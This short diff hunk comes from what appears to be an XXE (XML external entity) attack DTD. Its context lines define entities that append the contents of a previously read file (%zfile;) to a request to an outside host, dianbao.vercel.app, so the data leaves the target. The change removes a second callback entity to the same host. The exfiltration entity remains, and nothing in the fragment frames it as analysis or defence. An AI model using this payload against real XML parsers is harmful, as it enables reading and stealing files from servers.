@@ -9,5 +9,3 @@
 		%confirm1;
 <!ENTITY % al "<!ENTITY hello SYSTEM 'https://dianbao.vercel.app/send/3AD2781AD6E69/ESON%zfile;'>">
 		%al;
-<!ENTITY % confirm2 SYSTEM "https://dianbao.vercel.app/send/3AD2781AD6E69/ESON_tail">
-		%confirm2;
